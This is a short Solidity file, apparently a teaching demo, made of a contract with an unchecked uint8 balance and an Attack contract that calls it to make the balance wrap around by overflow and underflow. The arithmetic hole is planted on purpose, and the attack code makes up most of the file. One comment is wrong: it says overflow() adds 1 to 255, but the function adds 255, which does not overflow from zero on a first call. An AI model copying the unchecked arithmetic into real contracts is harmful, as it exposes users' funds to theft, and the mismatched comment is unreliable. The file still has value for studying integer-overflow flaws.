// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract OverflowUnderflow {
    uint8 public balance = 0;

    // Function to add value to the balance
    function add(uint8 value) public {
        balance += value; // Vulnerable to overflow
    }

    // Function to subtract value from the balance
    function subtract(uint8 value) public {
        balance -= value; // Vulnerable to underflow
    }
}


contract Attack {
    OverflowUnderflow public vulnerableContract;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = OverflowUnderflow(_vulnerableContractAddress);
    }

    // Attack to overflow the balance
    function overflow() public {
        // Adding 1 to max uint8 value (255) will cause overflow
        vulnerableContract.add(255);
    }

    // Attack to underflow the balance
    function underflow() public {
        // Subtracting 1 from 0 will cause underflow
        vulnerableContract.subtract(1);
    }
}
